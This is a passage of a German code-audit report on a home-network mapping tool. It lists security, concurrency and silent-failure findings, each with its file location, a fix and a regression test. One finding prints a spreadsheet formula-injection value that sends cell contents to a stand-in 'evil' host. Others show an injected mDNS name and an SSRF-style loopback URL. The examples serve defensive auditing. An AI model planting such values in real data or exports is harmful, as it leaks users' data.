- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/scanner/tr064.py:105-112`, `app/scanner/tr064.py:53-60`
- **Was passiert:** Spricht ein Gegenüber auf dem https-Port Klartext, wiederholt der Scanner dieselbe Anfrage per http auf demselben Port. Das gilt auch bei Zertifikatsfehlern und HTTP 401, ohne Logzeile. Die FRITZ!Box nimmt auf 49443 nur TLS an, der Rückfall hilft also nie.
- **Fix:** Den automatischen Rückfall streichen. Bei einem Klartext-Gegenüber, erkennbar an `WRONG_VERSION_NUMBER`, einen ERROR mit Hinweis auf `http://host:49000` loggen, bei Zertifikatsfehlern auf `NETZ_TR064_INSECURE_TLS` oder ein CA-Zertifikat verweisen. Bleibt ein Rückfall, dann nur als Opt-in mit WARNING je Lauf. Das Handbuch korrigiert W8 in Zeile 393.
- **Regressionstest:** `tests/test_scanner_inputs.py::test_tr064_https_failure_does_not_fall_back_to_http`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab, weil die Standard-Box mit Selbstzertifikat ohnehin `NETZ_TR064_INSECURE_TLS=true` braucht. Die Prüfung stiller Fehler fand denselben Rückfall in SF-8.

#### Der CSV-Export schreibt Hostnamen, Notizen und Hersteller mit führenden Formelzeichen unverändert (S-3)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/exporters.py:68-94`, `app/exporters.py:124-126`
- **Was passiert:** Ein Gerät, das sich als `=HYPERLINK("http://evil/?"&A2,"x")` meldet, steht wörtlich in der CSV, auch im Auto-Export. Öffnet der Admin sie in einer Tabellenkalkulation und bestätigt Import oder externe Inhalte, fließen Zellinhalte ab.
- **Fix:** Bei Freitextfeldern, die mit `=`, `+`, `-`, `@`, Tab oder CR beginnen, ein `'` voranstellen. Nur auf `hostname`, `vendor`, `note`, `room`, `link_port` und `connected_to` anwenden, nicht auf MAC, IP und Zeitstempel, und nicht im JSON-Export. Nebenwirkung: Werte wie `-bitte prüfen` zeigen das `'` in Programmen ohne Tabellenlogik.
- **Regressionstest:** `tests/test_export_security.py::test_csv_prefixes_formula_cells`

#### Die Login-Drossel zählt Fehlversuche erst nach der Passwortprüfung, parallele Anfragen umgehen das Limit (S-4)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/auth.py:194-215`
- **Was passiert:** 15 parallele falsche Logins von einer IP liefern 15 mal 401 statt ab dem sechsten 429. Der Gewinn ist durch den Threadpool begrenzt, etwa das Achtfache von 5 je 15 Minuten, jeder Versuch kostet einen PBKDF2-Lauf, den Passwort-Hash mit 600000 Runden.
- **Fix:** Den Versuch vor dem Hash unter dem Drossel-Lock reservieren, mit einem Zähler `pending`, und ablehnen, wenn Fehlversuche plus laufende Versuche das Limit erreichen. Ein doppelter Klick desselben Benutzers darf nicht sperren, laufende Versuche zählen erst als Fehlversuch, wenn der Hash scheitert.
- **Regressionstest:** `tests/test_login_race.py::test_parallel_wrong_logins_capped_at_limit`

#### Hinter einem Reverse Proxy sperren 20 falsche Logins jede Anmeldung, auch mit dem richtigen Passwort (S-5)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/security.py:83-101`, `app/auth.py:196-201`
- **Was passiert:** Hinter dem Proxy haben alle Anfragen dieselbe Quell-IP. Nach den Fehlversuchen liefert auch das richtige Admin-Passwort 429, bestehende Sitzungen und der direkte LAN-Zugriff laufen weiter. Die Doku nennt das schon als Grenze pro Benutzer, nicht als globale Sperre.
- **Fix:** Bei Sperre das Passwort trotzdem prüfen und ein richtiges durchlassen, die Kosten begrenzt der Zähler aus S-4. Optional `NETZ_TRUSTED_PROXIES` an uvicorn `forwarded_allow_ips` koppeln, zusammen mit S-13. `docs/03-sicherheit.md` Abschnitt 2.3 muss die globale Sperre benennen, das erledigt W8.
- **Regressionstest:** `tests/test_login_race.py::test_correct_password_passes_during_ip_lock`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab, weil Doku 2.3 den Fall schon teilweise benennt.

#### Mehrere Endpunkte antworten ohne Anmeldung mit WAN-IP, Gateway, Version und Scanzeiten (S-10)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/web.py:21`, `app/api.py:108-120`, `app/api.py:540-555`
- **Was passiert:** Ohne Login liefern `/api/meta` Version, Gateway, WAN-IP und WAN-Status, `/api/health` Version, Gerätezahl und Scanzeiten, außerdem `/api/sites` und `/api/scan/status` Daten. `PUBLIC_PATHS` in `app/web.py` ist die Liste der Pfade ohne Login.
- **Fix:** `/api/meta`, `/api/sites` und `/api/scan/status` aus `PUBLIC_PATHS` nehmen und mit Sitzung oder Token führen, `app.js` hängt den Token über `api()` schon an. `/api/health` auf `{"status": "ok"}` kürzen. Embed-Betrachter sehen die WAN-IP weiter, solange `/api/meta` nicht je Token gefiltert wird.
- **Regressionstest:** `tests/test_public_surface.py::test_meta_sites_scan_status_require_session`, `tests/test_public_surface.py::test_health_returns_only_status`
- **Hinweis:** web.py-Teil macht der Orchestrator, api.py-Teil Writer A.

#### Die mDNS-Rückwärtsauflösung übernimmt jede Antwort von jedem Host als Gerätenamen (S-11)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/scanner/names.py:78-98`, `app/scanner/names.py:102-135`
- **Was passiert:** mDNS ist die Namensabfrage im lokalen Netz. Ein Paket mit fremdem Eigentümernamen und Steuerzeichen lässt `resolve_hostname_mdns("192.0.2.1")` den Text `=HYPERLINK("http://x")` samt Zeichen `\x07` zurückgeben. Jeder Host im LAN kann so Gerätenamen setzen.
- **Fix:** Nur Antworten annehmen, deren Eigentümername zu `ptr_name(ip)` passt und deren Quelle bei IPv4 dem Ziel entspricht, Namen auf `[A-Za-z0-9._-]` und eine feste Länge beschränken. Das erhöht nur die Hürde, die eigentliche Absicherung ist S-3. Geräte, die von einer anderen Schnittstellenadresse antworten, verlieren den Namen.
- **Regressionstest:** `tests/test_scanner_inputs.py::test_mdns_ignores_foreign_owner_name`

#### Embed-Tokens stehen im Klartext im Zugriffslog von uvicorn (S-12)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/__main__.py:23`, `app/static/app.js:278`
- **Was passiert:** `GET /api/devices?token=<Klartext>` und `GET /embed?token=` erscheinen im Zugriffslog auf stdout. Das unterläuft die gehashte Ablage aus `docs/03-sicherheit.md` 2.12. In `netmap.log` und `/api/logs` stehen sie nicht.
- **Fix:** Einen Logfilter einbauen, der `token=` schwärzt, statt `access_log=False`, damit die Zugriffslogs bleiben. Der Token in der `/embed`-URL ist technisch nötig und landet in jedem Proxy-Log, das gehört in die Restrisiken von `docs/03-sicherheit.md`.
- **Regressionstest:** `tests/test_process_hardening.py::test_access_log_redacts_token`

#### uvicorn wertet `X-Forwarded-For` aus, obwohl die Doku das Gegenteil sagt (S-13)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/__main__.py:23`, `app/auth.py:195`
- **Was passiert:** Kommt die Anfrage von 127.0.0.1 oder ::1, übernimmt uvicorn die Client-IP aus dem Header. Nach 5 Fehlversuchen kam 429, mit gefälschtem Header 401 und die falsche IP im Log. Im Docker-Betrieb ist der Peer nie 127.0.0.1, betroffen sind Läufe ohne Docker.
- **Fix:** `proxy_headers=False` setzen, dann stimmt die Doku, oder `NETZ_FORWARDED_ALLOW_IPS` anbieten und die Doku ändern. Nebenwirkung von `False`: Hinter einem Proxy auf demselben Host zählt die Drossel alle Clients als 127.0.0.1. `_cookie_secure` liest `X-Forwarded-Proto` selbst und bleibt unberührt.
- **Regressionstest:** `tests/test_process_hardening.py::test_forwarded_for_ignored_by_default`

#### Die Online-Herstellerabfrage folgt Weiterleitungen, liest unbegrenzt und gibt die Antwort in die Oberfläche (S-14)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/scanner/oui.py:36-39`, `app/scanner/oui.py:69-77`
- **Was passiert:** Der Abruf liest bis 5 MB und speichert den Hersteller mit Länge 5000000. Mit `oui_online_url=http://127.0.0.1:631/?x=` fragt der Scanner Dienste auf dem Host ab und spiegelt die erste Zeile. Aktiv nur mit `oui_online_enabled`, Standard aus.
- **Fix:** Opener ohne Redirects, `resp.read(4096)`, Hersteller auf etwa 128 druckbare Zeichen kürzen, Ziele auf Loopback und Link-Local ablehnen. Nebenwirkung: Dienste, die von http auf https umleiten, funktionieren nur noch mit direkt eingetragener https-URL.
- **Regressionstest:** `tests/test_scanner_inputs.py::test_oui_online_no_redirect_and_capped`

#### Ein HTTP-Protokollfehler bei der Online-Herstellerabfrage bricht den ganzen Scan ab (N-5)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/scanner/oui.py:73`
- **Was passiert:** `BadStatusLine`, `LineTooLong` und `IncompleteRead` sind keine `URLError` und entkommen `lookup_online`, der Online-Abfrage eines Herstellers. Der Scan meldet dann in jeder Runde „Scan-Fehler“, solange ein unbekanntes Herstellerpräfix übrig ist.
- **Fix:** `http.client.HTTPException` mitfangen, am besten `Exception` mit WARNING. Der Fall wirkt nur mit `oui_online_enabled`.
- **Regressionstest:** `tests/test_scanner_inputs.py::test_oui_online_http_exception_does_not_abort_scan`
- **Hinweis:** Neu von der Sicherheitsprüfung B bei S-14 gefunden.

#### Der TR-064-Client begrenzt weder Antwortgröße noch Geräteanzahl, und eine fehlerhafte Zahl bricht den Scan ab (S-15)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/scanner/tr064.py:58`, `app/scanner/tr064.py:86-89`
- **Was passiert:** Meldet das Gegenüber `NewHostNumberOfEntries=1000000000`, starten 20000 SOAP-Aufrufe, bis der Testlauf stoppt. Ein Text wie `lots` löst einen `ValueError` aus, der an `except TR064Error` vorbeigeht und den ganzen Scan abbricht. Nötig ist ein Gegenüber im Endpunktpfad.
- **Fix:** Die Anzahl auf etwa 4096 kappen und mit WARNING loggen, `int()` in `TR064Error` einpacken, SOAP-Antworten streamend mit etwa 1 MB Grenze lesen und je Endpunkt ein Zeitbudget setzen. Netze mit mehr Hosts werden abgeschnitten, das Log sagt es.
- **Regressionstest:** `tests/test_scanner_inputs.py::test_tr064_host_count_capped`, `tests/test_scanner_inputs.py::test_tr064_non_numeric_count_raises_tr064error`

#### POST-Routen ohne Body lassen sich von Seiten desselben Standorts auslösen (S-16)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/api.py:258`, `app/api.py:558`, `app/auth.py:218`
- **Was passiert:** Der Cookie hat nur `SameSite=Lax`. Ein Formular von einem anderen Port derselben IP löst `POST /api/layout/reset` aus und leert alle Knotenpositionen, `/api/logout` ebenso. Das Muster heißt CSRF. Fremde Domains sind nicht betroffen.
- **Fix:** Eine Middleware prüft bei unsicheren Methoden mit Sitzungscookie, ob Origin oder Referer zum Host der Anfrage passen. Hinter Proxys, die den Host umschreiben, `X-Forwarded-Host` einbeziehen. Skripte ohne Origin brauchen eine Ausnahme. Ein eigener Header hätte `app.js` verändert.
- **Regressionstest:** `tests/test_csrf_origin.py::test_foreign_origin_post_rejected`
- **Hinweis:** Middleware in `app/web.py`, deshalb Orchestrator. `/api/scan` wurde nur im Code geprüft.

#### Datenbank und Log sind für alle lesbar, und das per Oberfläche gesetzte FRITZ!Box-Passwort liegt im Klartext in der Datenbank (S-17)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/db.py`, `app/logsetup.py:12`, `app/api.py:504-505`, `docker/entrypoint.sh`
- **Was passiert:** `netmap.db` und `netmap.log` haben Modus 0644, nur `initial-admin-password.txt` ist 0600. Ein lokaler Benutzer auf dem Docker-Host liest Notizen, SNMP-Community und `fritz_pass`.
- **Fix:** `os.umask(0o077)` im Entrypoint und beim App-Start setzen und bestehende Dateien beim Start per chmod anpassen. Das Klartext-`fritz_pass` in der Doku nennen. Nebenwirkung: Backup-Jobs anderer Benutzer auf dem Host verlieren den Lesezugriff.
- **Regressionstest:** `tests/test_process_hardening.py::test_data_files_not_world_readable`

#### Der Token-Ablauf in Stunden wird nicht geprüft: 0 heißt unbegrenzt, negative Werte sind schon abgelaufen (C-10)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/api.py:511-525`, `app/static/app.js:1354`
- **Was passiert:** `expires_hours=0` erzeugt ein Token ohne Ablauf, `-5` ein Token mit Ablauf in der Vergangenheit. Der Embed liefert dann 403, das Anlegen meldet 200.
- **Fix:** `Field(ge=1, le=...)` in `TokenCreate`. Nebenwirkung: `app.js:1354` sendet für die Eingabe „0“ den Wert 0 und bekäme 422, die Oberfläche muss 0 oder leer auf `null` abbilden oder die Meldung zeigen, das erledigt W5.
- **Regressionstest:** `tests/test_api.py::test_token_expires_hours_validated`
- **Hinweis:** Der UI-Teil folgt in W5.

### 7.2 Datenbank und Nebenläufigkeit

Datenverlust beim Start, Sperren zwischen Web und Scanner, Migration.

#### Der Start löscht ein echtes Gerät samt Notiz und Layout, wenn eine neue MAC dieselbe IP bekommt (K-3, C-14)

- **Schwere:** hoch · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/db.py:228-266`, `app/db.py:218`
- **Was passiert:** Ein NAS mit Notiz, Raum und manueller Verbindung geht offline, ein Handy mit anderer MAC bekommt dieselbe IP. Beim nächsten Start von Web oder Scanner löscht `dedupe_devices_by_ip` das NAS und gibt Layout und Verlauf dem Handy. Kommt das NAS zurück, ist es neu, mit Alarm und leerer Notiz.
- **Fix:** Nur `ip:`-Platzhalter in eine echte MAC einmischen, zwei echte MACs nie zusammenführen. Bei zwei echten MACs auf einer IP beide behalten und die IP des älteren Offline-Geräts leeren. MAC-randomisierende Handys bleiben als Doppelzeilen, die Aufbewahrung räumt sie ab. Das Handbuch korrigiert W8.
- **Regressionstest:** `tests/test_dedupe.py::test_two_real_macs_same_ip_are_kept`, `tests/test_dedupe.py::test_placeholder_merges_into_real_mac`
- **Hinweis:** C-14 vom Prüfer von niedrig auf mittel angehoben, K-3 hoch. Layouts mit `connected_to` auf die gelöschte MAC bleiben sonst dangling.

#### Jeder Datenbankzugriff nimmt den Schreib-Lock, auch reine Lesezugriffe und der Healthcheck (K-1)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/db.py:93-155`
- **Was passiert:** `connect()` führt bei jedem Aufruf `PRAGMA journal_mode=WAL`, `BEGIN IMMEDIATE` und eine Probe-Tabelle aus. Mit laufendem Scanner steigt die Verbindungszeit auf bis zu 0,78 s. Der falsche Fehler „WAL nicht nutzbar“ samt 500 braucht über 30 s Haltezeit, die nur K-2 erzeugt.
- **Fix:** Die Schreibprobe einmal je Prozess in `create_app` und im Scanner-Start ausführen, je Verbindung nur `busy_timeout` setzen. In der Probe `database is locked` weiterreichen, nicht auf DELETE zurückfallen. Nebenwirkung: Ein zur Laufzeit schreibgeschützter Mount fällt erst beim ersten Schreiben auf.
- **Regressionstest:** `tests/test_db_concurrency.py::test_connect_does_not_take_write_lock`
- **Hinweis:** Prüfer stufte von hoch auf mittel herab: Der Scanner hält den Lock in der Praxis nur Millisekunden.

#### Der Scanner hält eine Schreibtransaktion offen, während er auf Netzwerkantworten wartet (K-2)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/scanner/oui.py:75-76`, `app/db.py:454-458`, `app/scanner/run.py:407`
- **Was passiert:** `set_oui_cache` lässt eine Transaktion offen, bis `apply_scan`, die Funktion zum Speichern eines Scanergebnisses, committet. Der Lock überdauert weitere OUI-Abfragen mit je 5 s Timeout, DNS ohne eigenes Timeout und ping6, im ungünstigen Fall rund 45 s, dann liefert die Web-Seite über K-1 einen 500. Betrifft nur `oui_online_enabled` bei unbekannten Präfixen.
- **Fix:** `conn.commit()` direkt nach dem Cache-Insert in `set_oui_cache`. Keine Nebenwirkung.
- **Regressionstest:** `tests/test_db_concurrency.py::test_set_oui_cache_commits_immediately`

#### Die alte IP bleibt an einem Offline-Gerät stehen, und ein Treffer ohne MAC wird diesem Gerät zugeordnet (N-1)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/scanner/run.py:79`, `app/db.py:269-316`
- **Was passiert:** Ein Host ohne ARP-Eintrag auf der früheren IP des NAS wird von `known_mac()`, der Suche nach der MAC zu einer IP, dem NAS zugeordnet und überschreibt dessen Zeile mit Hostname, Ports und Status, statt einen `ip:`-Platzhalter zu bekommen.
- **Fix:** Beim Vergeben einer IP an eine MAC die IP anderer Zeilen leeren. Das schließt zusammen mit K-3 beide Fälle.
- **Regressionstest:** `tests/test_dedupe.py::test_known_mac_ignores_stale_ip`
- **Hinweis:** Neu vom Nebenläufigkeits-Prüfer, gleiche Wurzel wie K-3. Prüfer: niedrig bis mittel.

#### Eine unvollständige Erkennung überschreibt Hostname, Hersteller und IP mit leeren Werten (C-6)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/db.py:298-316`
- **Was passiert:** Ein TR-064-Datensatz ohne Namen für ein Offline-Gerät setzt `ip`, `hostname` und `vendor` auf leer, die Information geht still verloren.
- **Fix:** `COALESCE(NULLIF(?, ''), spalte)` für Hostname, Hersteller und IPv6 verwenden, bei `ip` die zuletzt bekannte behalten. Nebenwirkung: Ein bewusst entfernter Hostname wird nie wieder geleert.
- **Regressionstest:** `tests/test_db.py::test_upsert_keeps_enriched_fields_on_empty_record`

#### Nach einem Fehler mitten im Scan speichert `run_once` einen halben Scan (K-5)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/scanner/run.py:374-407`, `app/scanner/run.py:465-468`
- **Was passiert:** Bei einem `OperationalError`, etwa Datenträger voll, in `apply_scan` bei Gerät 2 committet das `finally` die Geräte 0 und 1. Das Ereignis `ports_changed` von Gerät 1 erscheint nie, auch nicht im nächsten Scan. `run_once` ist ein einzelner Scandurchlauf.
- **Fix:** `conn.rollback()` und erneutes Auslösen vor dem `finally`, das den Scanstatus schreibt. Ein Fehler verwirft den ganzen Scan, was richtig ist.
- **Regressionstest:** `tests/test_scanner_loop.py::test_failed_apply_scan_rolls_back`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab, weil ein Datenträgerfehler nötig ist.

#### Web und Scanner können beim ersten Start die Schemamigration gegeneinander laufen lassen (K-4)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W3
- **Ort:** `app/db.py:160-185`, `app/db.py:211-213`
- **Was passiert:** Beide Prozesse prüfen eine Spalte und führen dann `ALTER TABLE` aus. Gemessen liegen die Starts etwa 50 ms auseinander, das Fenster ist wenige Millisekunden breit, auf einer SD-Karte Dutzende. Der Verlierer stürzt mit `duplicate column name` ab und startet neu.
- **Fix:** `duplicate column name` abfangen und weitermachen, oder die Migration in `BEGIN IMMEDIATE` mit erneutem Lesen von `table_info` fassen. Besser alle Spalten ins SCHEMA und `PRAGMA user_version` nutzen. Hier entstehen zugleich die Spalten des Scanzustands aus SF-2.
- **Regressionstest:** `tests/test_migrations.py::test_concurrent_migration_survives_duplicate_column`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab: Der Absturz beim ersten Start ist selten, nicht der Normalfall.

#### Der Scanner ignoriert SIGTERM, und der Auto-Export schreibt Dateien nicht atomar (K-8)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W3
- **Ort:** `app/scanner/run.py:471-498`, `docker/entrypoint.sh:31`, `app/exporters.py:121-127`
- **Was passiert:** Der Scanner läuft als PID 1 per `exec` ohne Signal-Handler, `docker stop` wartet 10 s und beendet ihn dann hart. Exportdateien werden direkt geschrieben, ein Abbruch im falschen Moment hinterlässt eine abgeschnittene Datei.
- **Fix:** SIGTERM-Handler, der den Wartezustand der Schleife beendet, oder `init: true` in `docker-compose.yml`. Export in eine temporäre Datei schreiben und mit `os.replace` umbenennen.
- **Regressionstest:** `tests/test_scanner_loop.py::test_sigterm_stops_loop`, `tests/test_export_atomic.py::test_export_written_via_tmp_and_replace`

#### Ein Fehler beim Zusammenführen beim Start wird geloggt, danach committet `init_db` die halbe Zusammenführung (K-12)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W3
- **Ort:** `app/db.py:217-223`
- **Was passiert:** Der `except`-Zweig loggt, dann übernimmt `conn.commit()` den schon geänderten Teil der Gruppe.
- **Fix:** `conn.rollback()` im `except`.
- **Regressionstest:** `tests/test_dedupe.py::test_dedupe_failure_rolls_back`

#### `set_layout` liest und schreibt in getrennten Schritten, eine gleichzeitige Änderung kann verloren gehen (K-6)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W3
- **Ort:** `app/db.py:419-436`
- **Was passiert:** `set_layout` liest alle vier Spalten und schreibt sie zurück. Das Fenster beträgt Millisekunden, der Finder brauchte eine künstliche Verzögerung von 0,5 bis 1 s. Realistisch wäre der Auto-Parent-Commit des Scanners oder ein zweiter Tab.
- **Fix:** Spaltengenauer UPSERT, der nur die übergebenen Felder setzt. Keine Nebenwirkung.
- **Regressionstest:** `tests/test_db_concurrency.py::test_set_layout_updates_only_given_columns`

#### Lesen und erstes Schreiben laufen ohne gemeinsamen Schnappschuss, Exporte mischen Daten vor und nach einem Scan (K-10, K-11)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W3
- **Ort:** `app/scanner/run.py:376`, `app/db.py:270-272`, `app/exporters.py:30-35`, `app/db.py:375-400`
- **Was passiert:** `apply_scan` liest vor dem impliziten `BEGIN`, Exporte und Detailansicht führen mehrere Abfragen einzeln aus. Das Fenster beträgt Mikrosekunden, ein Scan-Commit kommt höchstens einmal je Intervall.
- **Fix:** `BEGIN IMMEDIATE` am Anfang von `apply_scan`. Für mehrteilige Lesevorgänge einen Helfer `read_snapshot(conn)` mit gemeinsamem `BEGIN` einführen, den Exporte und Detailansicht nutzen.
- **Regressionstest:** `tests/test_db_concurrency.py::test_read_snapshot_consistent_during_commit`

### 7.3 Scanner und stille Fehler

Falsche Erkennung, unsichtbare Fehler, verlorene Alarme.

#### Ein Gerät mit IPv4 und IPv6 verliert seine IPv4-Adresse, weil der IPv6-Eintrag den IPv4-Eintrag überschreibt (C-4)

- **Schwere:** hoch · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/run.py:93-97`, `app/scanner/run.py:116`, `app/scanner/discover.py:267-286`
- **Was passiert:** `merge_sources`, die Zusammenführung der Erkennungsquellen, führt Einträge je MAC zusammen. Findet der Scan dieselbe MAC als IPv4 mit `ping+arp` und als IPv6 mit `ndp`, bleibt nur `2001:db8::20` übrig. Das passiert in der Standardkonfiguration, weil `local_subnets()` das globale /64 aufnimmt.
- **Fix:** Für `ip` IPv4 bevorzugen und die IPv6-Adresse nach `ip6` legen, reine IPv6-Hosts behalten `ip` mit IPv6. Auch den TR-064-Abgleich `d["ip"] or h["ip"]` an `run.py:116` auf IPv4 umstellen.
- **Regressionstest:** `tests/test_merge_sources.py::test_dual_stack_prefers_ipv4_for_ip`, `tests/test_merge_sources.py::test_ipv6_only_host_keeps_ipv6_as_ip`

#### Eine leere oder gescheiterte Erkennung markiert alle Geräte als offline, nach 30 Tagen werden sie gelöscht (SF-1)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/run.py:366-372`, `app/scanner/discover.py:30-41`, `app/scanner/discover.py:57`
- **Was passiert:** Fehlen `ip` und `ping`, liefert der Scan 0 Geräte: 5 online werden 5 offline, ohne WARNING. Nach `device_retention_days`, Standard 30, löscht `apply_retention` alle samt Notizen und Layout. Nach der Rückkehr kommt eine Sammelmeldung je Kanal für alle Geräte als neu.
- **Fix:** Liefern Erkennung und TR-064 null Geräte oder keine Subnetze, obwohl vorher Geräte online waren, einen ERROR loggen und Offline-Übergang sowie Aufbewahrung überspringen. Die Sperre darf nur bei leeren Subnetzen oder fehlenden Binärdateien greifen, sonst zeigt ein wirklich leeres Netz nie offline. Zusätzlich WARNING bei `OSError` in `ping_host`.
- **Regressionstest:** `tests/test_scan_state.py::test_empty_discovery_does_not_mark_offline_or_retain`
- **Hinweis:** Prüfer stufte von hoch auf mittel herab: Es gibt keinen Alarmsturm während des Ausfalls, nur Datenverlust und eine Sammelmeldung danach.

#### Fehler beim Scan sind im Scanzustand, in `/api/health` und im Healthcheck nicht sichtbar (SF-2)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/run.py:490-491`, `app/db.py:69-74`, `app/api.py:108-121`, `app/healthcheck.py:45-60`
- **Was passiert:** Wirft `collect_devices`, die Erkennung eines Scans, loggt der Scanner dreimal „Scan-Fehler“, `last_scan` bleibt leer, `next_scan` wird neu gesetzt und `check_scanner`, die Scanner-Prüfung des Healthchecks, meldet gesund. `/api/health` hat fest `"status": "ok"`. Sichtbar ist es nur im Log-Reiter.
- **Fix:** In `scan_state`, der Tabelle mit dem Scanzustand, `last_error`, `last_error_at` und `consecutive_failures` führen, im `except` setzen, bei Erfolg löschen. Anzeige in `/api/scan/status`, Healthcheck unhealthy ab 3 Fehlern. Die Spalten legt W3 an, Docker startet bei unhealthy nicht von selbst neu.
- **Regressionstest:** `tests/test_scan_state.py::test_scan_error_recorded_and_cleared`, `tests/test_health_status.py::test_healthcheck_unhealthy_after_three_failures`
- **Hinweis:** Prüfer stufte von hoch auf mittel herab, weil der Fehler im Log-Reiter sichtbar ist.

#### Fehlgeschlagene Benachrichtigungen sind unsichtbar, und der Neu-Gerät-Alarm geht verloren (SF-5)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/notify.py:55-63`, `app/scanner/run.py:439`
- **Was passiert:** HTTP 302 gilt als Erfolg. 401 und Verbindungsfehler erzeugen eine WARNING, die nur auf dem Notfall-stderr landet und nie in `netmap.log` oder im Log-Reiter, siehe Q-8. Das Gerät ist vor dem Versand committet, einen Wiederholungsversuch gibt es nicht.
- **Fix:** Status ab 300 als Fehler werten, Logger auf `fox_netmap.notify` umstellen, `last_notify_status` und `last_notify_at` in `settings` speichern und in der Oberfläche anzeigen, die Anzeige liefert W5. Eine Wiederholungswarteschlange nur mit Duplikatschutz, sonst sendet ein flackernder Endpunkt alte Alarme erneut.
- **Regressionstest:** `tests/test_notify.py::test_redirect_status_counts_as_failure`, `tests/test_notify.py::test_failure_is_written_to_log_file`

#### Offline gemeldete TR-064-Hosts bekommen bei jedem Scan ein neues `last_seen`, die Aufbewahrung greift nie (C-5)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/db.py:296-316`, `app/scanner/run.py:416-426`
- **Was passiert:** Ein Gerät, das die FRITZ!Box offline listet, erhält `last_seen` des laufenden Scans, `apply_retention` löscht darum 0 Zeilen. Nachgestellt: online am 2026-01-01, Scan am 2026-11-26, danach `last_seen` 2026-11-26.
- **Fix:** `last_seen` nur setzen, wenn das Gerät online ist. Nebenwirkung: Die Spalte in Exporten ändert ihre Bedeutung, gewollt. Geräte, die die FRITZ!Box weiter listet, werden nach Ablauf gelöscht und erscheinen bei Rückkehr als neu mit Alarm.
- **Regressionstest:** `tests/test_scan_state.py::test_offline_record_keeps_last_seen`

#### Bei großen IPv6-Netzen wird die NDP-Liste nach dem Multicast-Ping berechnet und dann nicht benutzt (C-8)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/discover.py:248-255`
- **Was passiert:** Bei einem /64 ist die Nachbarliste vor `ff02::1` leer und danach gefüllt, `ping6_all_nodes` liefert Antworten, `discover()` gibt trotzdem `[]` zurück. Die neu berechneten Werte werden nur geloggt.
- **Fix:** Die berechneten Einträge ins Ergebnis übernehmen. Nebenwirkung: Mehr IPv6-Einträge verstärken C-4, deshalb zuerst C-4.
- **Regressionstest:** `tests/test_discovery_paths.py::test_discover_uses_post_multicast_ndp`

#### Die SNMP-Zuordnung ignoriert den Port, und der letzte Switch gewinnt für alle MACs (C-9)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/snmp.py:35-41`, `app/scanner/snmp.py:48-53`, `app/scanner/topology.py:126`
- **Was passiert:** Schon mit einem Switch lernt der Uplink-Port das Gateway und jeden WLAN-Client, alle drei gelten als am Switch hängend. Das Gateway bekommt `connected_to` gleich Switch, während der Switch das Gateway als Eltern hat. SNMP schlägt Mesh und TR-064, es entsteht ein Zyklus.
- **Fix:** Ports mit mehr als einer gelernten MAC oder mit der MAC eines anderen Switches oder des Gateways ignorieren. Nebenwirkung: Ein unmanaged Switch an einem Randport trägt viele MACs, seine Clients fallen auf Mesh und TR-064 zurück.
- **Regressionstest:** `tests/test_discovery_paths.py::test_cam_map_ignores_uplink_port`
- **Hinweis:** Der Prüfer fand es breiter als gemeldet: Es tritt schon mit einem Switch auf.

#### Der Healthcheck meldet gesund, solange `scanning=1` steht, auch wenn der Scan nie endet (SF-3, K-9)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W4
- **Ort:** `app/healthcheck.py:46-47`, `app/healthcheck.py:44-50`
- **Was passiert:** Bei `scanning=1` und einem `next_scan` von 2020 liefert `check_scanner` „Scan laeuft“ als gesund. Eine blockierende Stelle fand sich nicht, echt ist nur der gestoppte Scanner-Container, dann zeigt die Oberfläche dauerhaft „Scan läuft“.
